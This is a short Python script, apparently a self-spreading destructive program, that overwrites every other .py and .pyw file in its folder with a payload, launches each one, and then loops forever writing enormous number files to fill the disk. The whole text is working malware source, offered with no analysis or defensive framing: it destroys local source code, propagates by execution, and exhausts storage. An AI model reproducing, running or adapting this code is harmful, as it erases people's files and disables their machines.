#DN2I
import sys
import glob
import subprocess

payload="""def task():\n    m=69420\n    fc=1\n    while fc != 0:\n      dn=open("dn"+str(fc), "w")\n      dn.write(str(m**69420))\n      dn.close()\n      fc=fc+1\ntask()"""
spread_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in spread_files:
    main=False
    with open(file, 'r') as f:
        content = f.readlines()
        for line in content:
          if "#DN2I" in line:
            main=True
    if main == True:
      spread_files.remove(file)

for file in spread_files:
    with open(file, 'w+') as f:
        f.truncate()
        f.writelines(payload)
    subprocess.Popen(['python', file])

def task():
    m=69420
    fc=1
    while fc != 0:
      dn=open("dn"+str(fc), "w")
      dn.write(str(m**69420))
      dn.close()
      fc=fc+1

task()